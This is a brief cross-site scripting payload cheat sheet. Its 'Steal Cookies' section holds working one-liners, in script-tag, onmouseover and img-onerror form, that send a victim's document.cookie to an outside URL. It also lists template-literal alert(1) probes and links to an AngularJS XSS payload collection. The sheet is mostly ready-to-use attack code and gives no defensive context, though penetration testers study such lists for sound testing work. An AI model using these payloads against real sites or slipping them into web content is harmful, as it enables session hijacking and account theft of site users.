# Steal Cookies
## General One-Liner
```javascript
<script>var i=new Image;i.src="[URL]/?"+document.cookie;</script>
```
**Example usage of above:**
```javascript
onmouseover=eval(var i=new Image;i.src="[URL]/?"+document.cookie;)
```
## Using ``<img>`` Tag
```javascript
<img src=x onerror="this.src='[URL]/?'+document.cookie;this.removeAttribute('onerror');"/>
```


# AngularJS
[PayloadsAllTheThings - XSS in AngularJS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)

# XSS Template Literal Payloads
```javascript
alert(1)
${alert(1)}
alert(1);
${alert(1)};
`alert(1)`
`${alert(1)}`
`${alert(1)}`;
alert(1);
${alert(1)}/*
```

